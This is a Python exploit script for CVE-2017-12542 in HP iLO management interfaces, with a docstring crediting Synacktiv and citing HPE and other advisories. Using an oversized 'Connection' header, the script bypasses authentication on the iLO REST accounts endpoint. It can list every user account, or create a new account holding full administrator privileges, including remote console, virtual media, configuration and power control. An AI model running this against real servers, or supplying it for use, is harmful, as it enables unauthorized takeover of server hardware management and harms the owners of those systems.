 
"""
 
Vulnerability found and documented by synacktiv:
https://www.synacktiv.com/posts/exploit/rce-vulnerability-in-hp-ilo.html
 
Original advisory from HP:
https://support.hpe.com/hpsc/doc/public/display?docId=hpesbhf03769en_us
 
Other advisories for this CVE:
https://tools.cisco.com/security/center/viewAlert.x?alertId=54930
https://securitytracker.com/id/1039222
 
IMPORTANT: 
THIS EXPLOIT IS JUST FOR ONE OUT OF THE THREE VULNERABILITES COVERED BY CVE-2017-12542!!!
The two other vulns are critical as well, but only triggerable on the host itself.
 
 
"""
 
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import json
import urllib3
 
#all of the HP iLO interfaces run on HTTPS, but most of them are using self-signed SSL cert 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
exploit_trigger = {&#039;Connection&#039; : &#039;A&#039;*29}
accounts_url = &#039;https://%s/rest/v1/AccountService/Accounts&#039;
 
 
 
def test(ip):
     
    url = accounts_url % ip
    try:
        response = requests.get(url, headers = exploit_trigger, verify = False)
    except Exception as e:
        return False, &#039;Could not connect to target %s, Reason: %s&#039; % (ip, str(e))
 
    try:
        data = json.loads(response.text)
    except Exception as e:
        return False, &#039;Target response not as exected!, Exception data: %s&#039; % (str(e),)
 
    return True, data
 
def exploit(ip, username, password):
    Oem = {
        &#039;Hp&#039; : {
            &#039;LoginName&#039; : username,
            &#039;Privileges&#039;: {
                &#039;LoginPriv&#039; : True,
                &#039;RemoteConsolePriv&#039;: True,
                &#039;UserConfigPriv&#039; : True,
                &#039;VirtualMediaPriv&#039;: True,
                &#039;iLOConfigPriv&#039;:True,
                &#039;VirtualPowerAndResetPriv&#039;:True,
            }
        }
    }
    body = {
        &#039;UserName&#039;:username,
        &#039;Password&#039;:password,
        &#039;Oem&#039;:Oem
    }
    url = accounts_url % ip
 
 
 
    try:
        response = requests.post(url, json=body, headers = exploit_trigger, verify = False)
    except Exception as e:
        return False, &#039;Could not connect to target %s, Reason: %s&#039; % (ip, str(e))
 
    if response.status_code in [requests.codes.ok, requests.codes.created]:
        return True, response.text
    else:
        return False, &#039;Server returned status code %d, data: %s&#039; % (response.status_code, response.text)
 
if __name__ == &#039;__main__&#039;:
    import argparse
    import sys
    parser = argparse.ArgumentParser(description=&#039;CVE-2017-12542 Tester and Exploiter script.&#039;)
    parser.add_argument(&#039;ip&#039;, help=&#039;target IP&#039;)
    parser.add_argument(&#039;-t&#039;, action=&#039;store_true&#039;, default=True, help=&#039;Test. Trigger the exploit and list all users&#039;)
    parser.add_argument(&#039;-e&#039;, action=&#039;store_true&#039;, default=False, help=&#039;Exploit. Create a new admin user with the credentials specified in -u and -p&#039;)
    parser.add_argument(&#039;-u&#039;, help=&#039;username of the new admin user&#039;)
    parser.add_argument(&#039;-p&#039;, help=&#039;password of the new admin user&#039;)
 
    args = parser.parse_args()
 
    if args.e:
        if args.u is None or args.p is None:
            print(&#039;Username and password must be set for exploiting!&#039;)
            sys.exit()
        res, data = exploit(args.ip, args.u, args.p)
        if res:
            print(&#039;[+] Sucsessfully added user!&#039;)
        else:
            print(&#039;[-] Error! %s&#039; % data)
 
    elif args.t:
        res, data = test(args.ip)
        if res:
            print(&#039;[+] Target is VULNERABLE!&#039;)
            for i in data[&#039;Items&#039;]:
                print(&#039;[+] Account name: %s Username: %s&#039; % (i[&#039;Name&#039;], i[&#039;Oem&#039;][&#039;Hp&#039;][&#039;LoginName&#039;]))
        else:
            print(&#039;[-] Error! %s&#039; % data)

